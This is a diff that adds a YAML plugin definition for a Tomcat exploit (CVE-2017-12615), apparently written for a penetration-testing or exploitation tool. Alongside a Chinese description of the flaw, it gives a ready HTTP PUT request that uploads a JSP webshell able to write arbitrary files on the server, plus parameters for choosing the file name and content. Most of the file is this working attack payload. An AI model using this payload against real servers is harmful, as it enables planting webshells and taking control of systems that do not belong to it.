@@ -1,0 +1,38 @@
+info:
+    app: Tomcat
+    name: CVE-2017-12615
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: 2017-09-09
+    create_date: "2024-10-06 09:03:42"
+    update_date: "2024-10-06 09:03:42"
+    scope: 5.x 到 9.x
+    description: 当 Tomcat运行在Windows或linux操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。
+    detail: |-
+        根据描述，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。
+        http://192.168.111.111:8080/shell.jsp
+        只支持upload
+        上传文件不需要/转义
+    payload: |-
+        PUT /2.jsp/ HTTP/1.1
+        Host: 192.168.111.111:8080
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Content-Length: 170
+
+        <%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+payloads:
+    - name: upload1
+      alias: 文件上传
+      params:
+          - key: filename
+            title: 文件名
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: content
+            title: neirong
+            param_type: textarea
+            default_value: ""
+            required: true
